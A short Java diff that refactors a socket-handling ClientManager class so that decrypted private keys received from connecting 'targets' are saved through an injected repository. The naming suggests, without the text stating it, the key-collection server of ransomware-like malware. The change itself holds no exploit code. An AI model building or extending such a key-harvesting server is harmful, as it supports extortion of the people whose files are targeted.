@@ -14,9 +14,12 @@ public class ClientManager implements Runnable {
 	//Variables
 	private Socket socket;
 	private static EntityManager entityManager = EntityManager.getInstance();
+	private TargetRepository targetRepository;
 	
-	public ClientManager(Socket socket) {
+	
+	public ClientManager(Socket socket,TargetRepository targetRepository) {
 		this.socket = socket;
+		this.targetRepository = targetRepository;
 	}
 
 	@Override
@@ -34,7 +37,7 @@ public class ClientManager implements Runnable {
 			Target target = new Target();
 			keyBase64 = entityManager.decryptByte(keyBase64);
 			target.setPrivateKey(keyBase64);
-			AlukAserverApplication.saveTarget(target);
+			targetRepository.save(target);
 		} catch (IOException e) {
 			e.printStackTrace();
 		}
